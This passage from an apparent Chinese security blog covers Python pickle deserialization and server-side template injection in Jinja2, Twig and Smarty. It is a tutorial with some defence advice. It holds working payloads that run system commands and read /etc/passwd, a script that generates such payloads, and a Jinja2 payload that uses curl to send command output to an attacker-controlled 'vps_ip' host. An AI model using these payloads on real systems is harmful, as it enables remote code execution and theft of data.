class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>_instantiate执行<span class="token punctuation">(</span>cls<span class="token punctuation">,</span> args<span class="token punctuation">)</span>dispatch<span class="token punctuation">[</span>OBJ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_obj<span class="token comment" spellcheck="true">#弹栈，将函数和参数交给_instantiate执行</span></code></pre><p>payload:</p><pre class=" language-text"><code class="language-text">b'(cos\nsystem\nX\x06\x00\x00\x00whoamio.'</code></pre><ul><li>b</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_build</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack    state <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    inst <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    setstate <span class="token operator">=</span> getattr<span class="token punctuation">(</span>inst<span class="token punctuation">,</span> <span class="token string">"__setstate__"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>    <span class="token keyword">if</span> setstate <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>        setstate<span class="token punctuation">(</span>state<span class="token punctuation">)</span>        <span class="token keyword">return</span>    slotstate <span class="token operator">=</span> None    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>state<span class="token punctuation">,</span> tuple<span class="token punctuation">)</span> <span class="token operator">and</span> len<span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        state<span class="token punctuation">,</span> slotstate <span class="token operator">=</span> state    <span class="token keyword">if</span> state<span class="token punctuation">:</span>        inst_dict <span class="token operator">=</span> inst<span class="token punctuation">.</span>__dict__        intern <span class="token operator">=</span> sys<span class="token punctuation">.</span>intern        <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> state<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> type<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">is</span> str<span class="token punctuation">:</span>                inst_dict<span class="token punctuation">[</span>intern<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> v            <span class="token keyword">else</span><span class="token punctuation">:</span>                inst_dict<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v    <span class="token keyword">if</span> slotstate<span class="token punctuation">:</span>            <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> slotstate<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                setattr<span class="token punctuation">(</span>inst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>dispatch<span class="token punctuation">[</span>BUILD<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_build<span class="token comment" spellcheck="true">#上面实例分析有，不在复述</span></code></pre><ul><li>payload</li></ul><pre class=" language-text"><code class="language-text">class lees:    passb'\x80\x03c__main__\lees\n)\x81&#125;X\x0C\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.'</code></pre><h2 id="pker工具"><a href="#pker工具" class="headerlink" title="pker工具"></a><a href="https://github.com/eddieivan01/pker">pker工具</a></h2><p>pker工具可以仿python产生pickle opcode，当让还是建议手撸，pker辅助。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>为了解决pickle反序列化的问题，官方给的方法是重写<code>Unpickler.find_class()</code>加入白名单来解决，并且给出警告：对于允许反序列化的对象必须要保持警惕。对于开发者而言，如果实在要给用户反序列化的权限，最好使用双白名单限制<code>module</code>和<code>name</code>并充分考虑到白名单中的各模块和各函数是否有危险。</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/8342">https://xz.aliyun.com/t/8342</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></p><p>深入学习：</p><p><a href="https://tttang.com/archive/1294/#toc_python">https://tttang.com/archive/1294/#toc_python</a></p><p><a href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p><p><a href="https://xz.aliyun.com/t/7012">https://xz.aliyun.com/t/7012</a></p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI(服务器模板注入)</title>
      <link href="/2021/10/11/ssti/"/>
      <url>/2021/10/11/ssti/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>官方解释：“模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。”</p><p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p><h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><p>当前的框架基本上都采用MVC模式。M（模板），V（视图），C（控制器）。用户数据给控制器，控制器将数据交给对应模板处理，最终经过渲染展现给用户。</p><span id="more"></span><p>漏洞形成的原因就是服务器接收到用户的恶意数据，未经过处理就经模板处理，破坏模板架构，在渲染过程中执行恶意语句，因而导致信息泄露，代码执行，getshell等。<br><img src="https://bu.dusays.com/2021/10/11/775720513505a.png" alt="各类语言模板引擎"></p><h3 id="对服务器进行指纹识别"><a href="#对服务器进行指纹识别" class="headerlink" title="对服务器进行指纹识别"></a>对服务器进行指纹识别</h3><p>蓝色框包含要测试的注入字符串。如果注射有效，请按照绿色箭头进行操作。如果注射失败，请按照红色箭头进行操作。</p><p><img src="https://bu.dusays.com/2021/10/18/f060f8d40b6d4.png"></p><p>为了进一步利用这个服务器，我们需要浏览 Python 3 的继承层次结构。所以首先，我们将在模板引擎之外检查它。</p><p><img src="https://bu.dusays.com/2021/10/18/a64da58aa32dc.png"></p><p>沿着 Python 层次结构向上移动到顶部的“对象”再，从<strong>object</strong>到**<strong>subclasses</strong><strong>、 <strong>catch_warnings</strong>和</strong><strong>import</strong>** 到达<strong>os.system</strong>，它允许我们执行任意命令。</p><p>catch_warning是捕获与错误处理有关的警告类，它有一个导入方法，比如我可以导入os达到任意执行</p><p><a href="https://bowneconsultingcontent.com/pub/EH/proj/ED105.htm">Server Side Template Injection</a></p><h2 id="python-ssti"><a href="#python-ssti" class="headerlink" title="python ssti"></a>python ssti</h2><p>目前python常见模板引擎有jinjia2、Django、tornado等</p><h3 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h3><p>jinjia2中存在三种语法</p><pre class=" language-text"><code class="language-text">1. &#123;&#123; &#125;&#125; 变量取值2. &#123;% %&#125; 控制结构3.  注释4. \# \# 可以有和&#123;% %&#125;相同的效果</code></pre><p>jinjia2的变量<br><img src="https://bu.dusays.com/2021/10/11/e80e411c8e9af.png"><br>我们可以知道变量并不是直接将其直接转为python代码执行，而是只支持变量及其属性元素。也就说对于变量它是直接把它解析成python对象来运行了。<br>既然支持变量的属性、方法调用，那就可以利用一些特殊的属性来进行注入。</p><ul><li><p>__class__<br>获取实例对象的类<br>‘’.__class__   &#x3D;&#x3D;&gt;  &lt;class ‘str’&gt;</p></li><li><p>__mro__<br>获取当前类对象的所有继承类，返回一个tuple，包含了这个类所有继承的基类，顺序就是MRO（Method Resolution Order） 寻找的顺序<br><img src="https://bu.dusays.com/2021/10/15/dc295e01a812e.png"><br>更多可以看这里：<a href="https://blog.csdn.net/rfrder/article/details/113866139">https://blog.csdn.net/rfrder/article/details/113866139</a></p></li><li><p>__base__<br>返回父类，记住是父类不是基类，只是在python3中字符串的父类是基类而已<br><img src="https://bu.dusays.com/2021/10/15/baa5da0e2266d.png"></p></li><li><p>__subclasses__()<br>返回了类的所有存活的子类的引用。而python中所有的类都是继承于object这个类，所以只要调用object这个类的__subclasses__()方法就可以获取我们想要的类的对象。比如用于读取文件的file对象。</p></li><li><p>__globals__<br>所有的函数都会有一个__globals__属性,它会以一个dict，返回函数所在模块命名空间中的所有变量。<br>例如</p><pre class=" language-python"><code class="language-python">outFuncVar <span class="token operator">=</span> <span class="token number">2</span><span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  inFuncVar <span class="token operator">=</span> <span class="token number">1</span>  <span class="token keyword">pass</span><span class="token keyword">print</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>__globals__<span class="token punctuation">)</span><span class="token keyword">import</span> os<span class="token keyword">print</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>__globals__<span class="token punctuation">)</span></code></pre><p>输出如下</p><pre class=" language-python"><code class="language-python"><span class="token operator">&lt;</span>function func at <span class="token number">0x000001A0B8777F28</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;'outFuncVar': 2, , '__builtins__': &lt;module 'builtins' (built-in)>&amp;#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;'outFuncVar': 2, , 'os': &lt;module 'os' from 'F:\\Python\\lib\\os.py'>, '__builtins__': &lt;module 'builtins' (built-in)>&amp;#125;</span></code></pre><p>可以看到__globals__中会包括引入了的modules；同时每个python脚本都会自动加载 builtins （内置函数所在的模块）这个模块，而且这个模块包括了很多强大的built-in 函数(内置函数)，例如eval, exec,open,print,orange等等。<br>所以我们只需要从内置变量出发，调用隐藏属性，然后找到任意一个函数，然后查看它的__globals__[‘__builtins __‘]就可以了。而所有的类都有__init__函数，所以我们直接找__init__函数就是了。</p></li></ul><p>更多可以看原文链接：<a href="https://www.freebuf.com/vuls/162752.html">Flask jinja2模板注入思路总结</a> （包含payload和脚本）</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#可以用于python2，3，根据自己环境修改了脚本的一些地方，</span><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token comment" spellcheck="true"># python 3.5</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template<span class="token comment" spellcheck="true"># Some of special names</span>cnt<span class="token operator">=</span><span class="token number">0</span>searchList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__init__'</span><span class="token punctuation">,</span> <span class="token string">"__new__"</span><span class="token punctuation">,</span> <span class="token string">'__del__'</span><span class="token punctuation">,</span> <span class="token string">'__repr__'</span><span class="token punctuation">,</span> <span class="token string">'__str__'</span><span class="token punctuation">,</span> <span class="token string">'__bytes__'</span><span class="token punctuation">,</span> <span class="token string">'__format__'</span><span class="token punctuation">,</span> <span class="token string">'__lt__'</span><span class="token punctuation">,</span> <span class="token string">'__le__'</span><span class="token punctuation">,</span> <span class="token string">'__eq__'</span><span class="token punctuation">,</span> <span class="token string">'__ne__'</span><span class="token punctuation">,</span> <span class="token string">'__gt__'</span><span class="token punctuation">,</span> <span class="token string">'__ge__'</span><span class="token punctuation">,</span> <span class="token string">'__hash__'</span><span class="token punctuation">,</span> <span class="token string">'__bool__'</span><span class="token punctuation">,</span> <span class="token string">'__getattr__'</span><span class="token punctuation">,</span> <span class="token string">'__getattribute__'</span><span class="token punctuation">,</span> <span class="token string">'__setattr__'</span><span class="token punctuation">,</span> <span class="token string">'__dir__'</span><span class="token punctuation">,</span> <span class="token string">'__delattr__'</span><span class="token punctuation">,</span> <span class="token string">'__get__'</span><span class="token punctuation">,</span> <span class="token string">'__set__'</span><span class="token punctuation">,</span> <span class="token string">'__delete__'</span><span class="token punctuation">,</span> <span class="token string">'__call__'</span><span class="token punctuation">,</span> <span class="token string">"__instancecheck__"</span><span class="token punctuation">,</span> <span class="token string">'__subclasscheck__'</span><span class="token punctuation">,</span> <span class="token string">'__len__'</span><span class="token punctuation">,</span> <span class="token string">'__length_hint__'</span><span class="token punctuation">,</span> <span class="token string">'__missing__'</span><span class="token punctuation">,</span><span class="token string">'__getitem__'</span><span class="token punctuation">,</span> <span class="token string">'__setitem__'</span><span class="token punctuation">,</span> <span class="token string">'__iter__'</span><span class="token punctuation">,</span><span class="token string">'__delitem__'</span><span class="token punctuation">,</span> <span class="token string">'__reversed__'</span><span class="token punctuation">,</span> <span class="token string">'__contains__'</span><span class="token punctuation">,</span> <span class="token string">'__add__'</span><span class="token punctuation">,</span> <span class="token string">'__sub__'</span><span class="token punctuation">,</span><span class="token string">'__mul__'</span><span class="token punctuation">]</span>neededFunction <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">]</span>pay <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"Payload?[1|0]"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> index<span class="token punctuation">,</span> i <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;.__class__.__base__.__subclasses__()):</span>    <span class="token keyword">for</span> attr <span class="token keyword">in</span> searchList<span class="token punctuation">:</span>        <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>i<span class="token punctuation">,</span> attr<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> eval<span class="token punctuation">(</span><span class="token string">'str(i.'</span><span class="token operator">+</span>attr<span class="token operator">+</span><span class="token string">')[1:9]'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'function'</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> goal <span class="token keyword">in</span> neededFunction<span class="token punctuation">:</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>eval<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token operator">+</span>goal<span class="token operator">+</span><span class="token string">'" in i.'</span><span class="token operator">+</span>attr<span class="token operator">+</span><span class="token string">'.__globals__["__builtins__"].keys()'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> pay <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">,</span> i<span class="token punctuation">.</span>__name__<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span> attr<span class="token punctuation">,</span> goal<span class="token punctuation">)</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">,</span><span class="token string">": &amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__=='"</span> <span class="token operator">+</span> i<span class="token punctuation">.</span>__name__ <span class="token operator">+</span> <span class="token string">"' %&amp;#125;&amp;#123;&amp;#123; c."</span> <span class="token operator">+</span> attr <span class="token operator">+</span> <span class="token string">".__globals__['__builtins__']['"</span> <span class="token operator">+</span> goal <span class="token operator">+</span> <span class="token string">"'](\"__import__('os').system('whoami')\") &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;"</span><span class="token punctuation">)</span>    cnt<span class="token operator">+=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#[].__class__.__base__.__subclasses__()[471].__init__.__globals__['__builtins__']['exec']("__import__('os').system('whoami')")</span></code></pre><ul><li><p>__builtins__</p><p>每个python脚本都会自动加载 builtins 这个模块，而且这个模块包括了很多强大的built-in 函数，例如eval, exec, open等等。</p><p>python3:</p></li></ul><pre class=" language-python"><code class="language-python">cnt<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">"catch_warnings"</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#        c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span>        cnt<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        cnt<span class="token operator">+=</span><span class="token number">1</span>例：<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">146</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">)</span></code></pre><p>python2:</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">)</span></code></pre><ul><li>config.item()<pre class=" language-text"><code class="language-text">&#123;&#123; config.item() &#125;&#125;  可以获取一些配置信息</code></pre></li></ul><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>在模板里过滤器相当于一个函数，变量通过过滤器处理后返回，语法<code>&#123;&#123; 变量 | 过滤器 &#125;&#125;</code></p><p>原文介绍</p><pre class=" language-text"><code class="language-text">变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器。看看例子&#123;&#123;my_variable|default('my_variable is not defined')&#125;&#125; my_variable 为变量，default为过滤器,my_variable is not defined是过滤器的参数。default过滤器的含义是：判断被转换的变量是否被定义过，如果没有被定义，则用字符串参数替换被转换的变量。</code></pre><p>在ssti里常用的是attr过滤器，更多的过滤器可以去这里了解下<a href="https://blog.csdn.net/weixin_44737646/article/details/104279561">jinja2-模板过滤器</a></p><h4 id="命令执行注入"><a href="#命令执行注入" class="headerlink" title="命令执行注入"></a>命令执行注入</h4><p>在object的所有子类中找可以引入了os模块的类，并以此来执行命令</p><pre class=" language-python"><code class="language-python">cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#print item</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>         <span class="token keyword">if</span> <span class="token string">'os'</span> <span class="token keyword">in</span> item<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">,</span> item<span class="token punctuation">)</span>        cnt<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        cnt<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">continue</span></code></pre><p>payload：</p><pre class=" language-text"><code class="language-text">&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['os'].system('ls > tt.txt & cat tt.txt | xargs -I &#123;&#125; curl http://vps_ip/?&#123;&#125;')&#125;&#125;这里用到了xargs来传递管道参数，xargs的一个选项-I，使用-I指定一个替换字符串&#123;&#125;，这个字符串在xargs扩展时会被替换掉，当-I与xargs结合使用，每一个参数命令都会被执行一次（注：xargs的详细用法见http://man.linuxde.net/xargs）</code></pre><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><pre class=" language-python"><code class="language-python">cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#print item</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"file"</span> <span class="token keyword">in</span> str<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">,</span> item<span class="token punctuation">)</span>        cnt<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        cnt<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">continue</span></code></pre><p>找到有读文件功能的类，比如说在40下标有个’file’类<br>payload：</p><pre class=" language-python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>需要注意的一个点：python3已经移除了file。所以利用file子类文件读取只能在python2中用。</p><p>文章：<a href="https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/python/">关于python魔术方法payload：””.__class__.__mro__[2].__subclasses__()<a href="%22/etc/passwd%22">40</a>.read() 的解释</a></p><p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">Jinja2 template injection filter bypasses</a></p><p><a href="https://dar1in9s.github.io/2020/09/15/ssti%E8%BF%9B%E9%98%B6/">进阶bypass学习</a></p><h2 id="php-ssti"><a href="#php-ssti" class="headerlink" title="php ssti"></a>php ssti</h2><p>目前常见的php模板引擎有Twig、smarty、blade等</p><h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>在Twig模板引擎里,， 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</p><p>Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env，env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache() 方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置，所以</p><p>模板的攻击手法都差不多</p><pre class=" language-text"><code class="language-text">&#123;&#123;'/etc/passwd'|file_excerpt(1,30)&#125;&#125;&#123;&#123;app.request.files.get(1).__construct('/etc/passwd','')&#125;&#125;&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125;&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;&#123;&#123;["id"]|map("system")|join(",")&#123;&#123;["id",0]|sort("system")|join(",")&#125;&#125;&#123;&#123;["id"]|filter("system")|join(",")&#125;&#125;&#123;&#123;[0,0]|reduce("system","id")|join(",")&#125;&#125;&#123;&#123;['cat /etc/passwd']|filter('system')&#125;&#125;</code></pre><p>具体可以看这篇文章：<a href="https://xz.aliyun.com/t/7518">TWIG 全版本 通用 SSTI payload</a></p><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>Smarty为不受信任的模板执行提供了安全模式。设置了白名单，那在模板中就无法调用任意函数。但通过阅读smarty的官方手册发现，$smarty内置变量可用于访问环境变量，</p><p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getStreamVariable</span><span class="token punctuation">(</span><span class="token variable">$variable</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$_result</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$variable</span><span class="token punctuation">,</span> <span class="token string">'r+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$current_line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token variable">$_result</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$current_line</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$_result</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">smarty</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">smarty</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error_unassigned</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SmartyException</span><span class="token punctuation">(</span><span class="token string">'Undefined stream variable "'</span> <span class="token punctuation">.</span> <span class="token variable">$variable</span> <span class="token punctuation">.</span> <span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>payload<span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;self::getStreamVariable("file:</span><span class="token comment" spellcheck="true">///etc/passwd")&amp;#125;</span></code></pre><p>但并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p><p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Smarty_Internal_Write_File</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token comment" spellcheck="true">/**     * Writes file in a safe way to disk     *     * @param  string $_filepath complete filepath     * @param  string $_contents file content     * @param  Smarty $smarty    smarty instance     *     * @throws SmartyException     * @return boolean true     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">,</span> <span class="token variable">$_contents</span><span class="token punctuation">,</span> Smarty <span class="token variable">$smarty</span><span class="token punctuation">)</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$_error_reporting</span> <span 